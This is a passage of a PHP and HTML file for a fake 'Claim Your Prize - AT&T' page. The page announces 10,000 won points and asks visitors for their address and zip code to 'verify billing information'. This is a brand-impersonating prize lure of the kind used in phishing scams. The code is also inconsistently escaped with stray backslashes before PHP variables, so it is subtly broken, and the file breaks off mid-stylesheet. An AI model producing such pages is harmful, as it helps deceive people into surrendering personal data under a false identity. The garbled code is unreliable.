<?php
session_start();

// Initialize variables
\$message = '';
\$message_type = ''; // 'success' or 'error'
\$points_won = 10000;

// Handle form submission
if (\$_SERVER["REQUEST_METHOD"] == "POST") {
    // Get and sanitize input
    $address = htmlspecialchars($_POST['address']);
    $zip_code = htmlspecialchars($_POST['zip_code']);

    // Simple validation simulation
    if (!empty(\$address) && !empty(\$zip_code)) {
        // In a real application, you would verify this against the database
        // For this script, we assume it's valid
        $message = "Verification successful! Your $points_won AT&T points have been added to your account.";
        \$message_type = 'success';
        
        // Optional: Clear session or redirect after delay
        // header("Refresh: 3; url=login.php");
    } else {
        \$message = "Please complete all fields to verify your billing information.";
        \$message_type = 'error';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claim Your Prize - AT&T</title>
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .container {
            background-color: white;
            width: 100%;
            max-width: 450px;
            padding: 40px;
            border: 1px solid #d1d1d1;
            border-radius: 4px;
            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
            text-align: center;
        }

        .logo-text {
            font-size: 28px;
            font-weight: 300;
            color: #0066cc;
            margin-bottom: 10px;
        }

        .congrats-title {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        .prize-box {
            background-color: #e6f0fa;
            border: 1px solid #cce0f5;
            border-radius: 4px;
            padding: 20px;
            margin: 20px 0;
        }

        .points-amount {
            font-size: 48px;
            font-weight: bold;
            color: #0066cc;
            margin: 10px 0;
        }

        .points-label {
            font-size: 14px;
            color: #555;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }

        label {
            display: block;
            font-size: 14px;
            color: #333;
            margin-bottom: 5px;
            font-weight: 500;
        }

        input[type="text"],
        input[type="password"],
        input[type="email"] {
            width: 100%;
            padding: 12px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 2px;
            box-sizing: border-box;
            transition: border-color 0.2s;
        }

        input:focus {
            border-color: #0066cc;
            outline: none;
        }

        .btn-submit {
            width: 100%;
            padding: 14px;
            background-color: #0066cc;
            color: white;
            border: none;
            border-radius: 2px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.2s;
        }

        .btn-submit:hover {
            background-color: #0052a3;
        }

        .message-box {
            padding: 12px;
            margin-bottom: 20px;
            border-radius: 4px;
            font-size: 14px;
            display: none;
        }

        .message-box.error {
            background-color: #fce8e6;
            color: #d32f2f;
            border: 1px solid #d32f2f;
            display: block;
        }

        .message-box.success {
            background-color: #e8f5e9;
            color: